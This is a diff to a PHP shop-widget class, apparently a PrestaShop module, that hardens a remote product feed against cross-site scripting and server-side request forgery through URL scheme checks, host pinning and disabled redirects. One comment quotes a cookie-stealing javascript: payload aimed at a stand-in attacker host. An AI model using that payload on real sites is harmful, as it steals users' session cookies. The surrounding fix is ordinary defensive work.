@@ -5,6 +5,10 @@
  * @license   https://opensource.org/licenses/MIT MIT License
  */
 
+if (!defined('_PS_VERSION_')) {
+    exit;
+}
+
 /**
  * ============================================================================
  *  MegVentureAdsWidget — drop-in "you might also like" widget for MEG Venture
@@ -56,8 +60,8 @@ class MegVentureAdsWidget
             return '';
         }
         $shopName = $data['shop_name'];
-        $shopLogoUrl = $data['shop_logo_url'];
-        $shopUrl = $data['shop_url'];
+        $shopLogoUrl = self::safeUrl($data['shop_logo_url']);
+        $shopUrl = self::safeUrl($data['shop_url']);
 
         $uid = 'mvads' . substr(md5($widgetUrl . microtime()), 0, 8);
 
@@ -118,8 +122,8 @@ class MegVentureAdsWidget
 
         foreach ($items as $item) {
             $name = isset($item['name']) ? (string) $item['name'] : '';
-            $link = isset($item['link_url']) ? (string) $item['link_url'] : '';
-            $img = isset($item['image_url']) ? (string) $item['image_url'] : '';
+            $link = self::safeUrl(isset($item['link_url']) ? $item['link_url'] : '');
+            $img = self::safeUrl(isset($item['image_url']) ? $item['image_url'] : '');
             $desc = isset($item['description_short']) ? (string) $item['description_short'] : '';
             $price = isset($item['price_formatted']) ? (string) $item['price_formatted'] : '';
             if ($name === '' || $link === '') {
@@ -212,16 +216,25 @@ class MegVentureAdsWidget
     {
         $empty = ['items' => [], 'shop_name' => '', 'shop_logo_url' => '', 'shop_url' => ''];
 
+        if (!self::isAllowedWidgetUrl($url)) {
+            return $empty;
+        }
+
         $body = null;
         if (function_exists('curl_init')) {
             $ch = curl_init($url);
-            curl_setopt_array($ch, [
+            $opts = [
                 CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_FOLLOWLOCATION => true,
+                CURLOPT_FOLLOWLOCATION => false,
                 CURLOPT_TIMEOUT => self::TIMEOUT,
                 CURLOPT_CONNECTTIMEOUT => 2,
                 CURLOPT_SSL_VERIFYPEER => true,
-            ]);
+            ];
+            if (defined('CURLPROTO_HTTP') && defined('CURLPROTO_HTTPS')) {
+                $opts[CURLOPT_PROTOCOLS] = CURLPROTO_HTTP | CURLPROTO_HTTPS;
+                $opts[CURLOPT_REDIR_PROTOCOLS] = CURLPROTO_HTTP | CURLPROTO_HTTPS;
+            }
+            curl_setopt_array($ch, $opts);
             $result = curl_exec($ch);
             $status = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
             curl_close($ch);
@@ -230,7 +243,12 @@ class MegVentureAdsWidget
             }
         } else {
             $context = stream_context_create([
-                'http' => ['method' => 'GET', 'timeout' => self::TIMEOUT, 'ignore_errors' => true],
+                'http' => [
+                    'method' => 'GET',
+                    'timeout' => self::TIMEOUT,
+                    'ignore_errors' => true,
+                    'follow_location' => 0,
+                ],
             ]);
             $result = @file_get_contents($url, false, $context);
             $body = $result !== false ? $result : null;
@@ -250,5 +268,67 @@ class MegVentureAdsWidget
             'shop_logo_url' => isset($data['shop_logo_url']) ? (string) $data['shop_logo_url'] : '',
             'shop_url' => isset($data['shop_url']) ? (string) $data['shop_url'] : '',
         ];
+    }
+
+    /**
+     * An address out of the feed, or '' if it is not one we are willing to put
+     * in an href or a src.
+     *
+     * Everything in the feed is escaped with htmlspecialchars before it reaches
+     * the page, and htmlspecialchars is the wrong tool for a URL: it makes
+     * `javascript:fetch('//attacker/?c='+document.cookie)` safe to sit inside an
+     * attribute and completely unchanged as a thing the browser will run when an
+     * employee clicks the card. The escape stops the attribute being broken out
+     * of; only a scheme check stops the attribute being used as intended
+     * (CWE-79, via CWE-829 - trusting a response from somewhere else).
+     *
+     * So: absolute http/https with a host, or nothing. Relative addresses are
+     * refused too - the feed is a different origin, and a relative URL resolved
+     * against the back office is never what it meant.
+     *
+     * @param string $url
+     *
+     * @return string
+     */
+    public static function safeUrl($url)
+    {
+        $url = trim((string) $url);
+        if ($url === '') {
+            return '';
+        }
+
+        $parts = parse_url($url);
+        if (!is_array($parts) || empty($parts['scheme']) || empty($parts['host'])) {
+            return '';
+        }
+
+        if (!in_array(strtolower((string) $parts['scheme']), ['http', 'https'], true)) {
+            return '';
+        }
+
+        return $url;
+    }
+
+    /**
+     * Widget URL is authored in module PHP (not request input), but still pin
+     * host + scheme so a compromised/redirecting feed cannot become SSRF
+     * into the shop's private network (CWE-918).
+     *
+     * @param string $url
+     *
+     * @return bool
+     */
+    public static function isAllowedWidgetUrl($url)
+    {
+        $parts = parse_url((string) $url);
+        if (!is_array($parts) || empty($parts['scheme']) || empty($parts['host'])) {
+            return false;
+        }
+        if (!in_array(strtolower((string) $parts['scheme']), ['http', 'https'], true)) {
+            return false;
+        }
+        $host = strtolower((string) $parts['host']);
+
+        return $host === 'megventure.com' || $host === 'www.megventure.com';
     }
 }
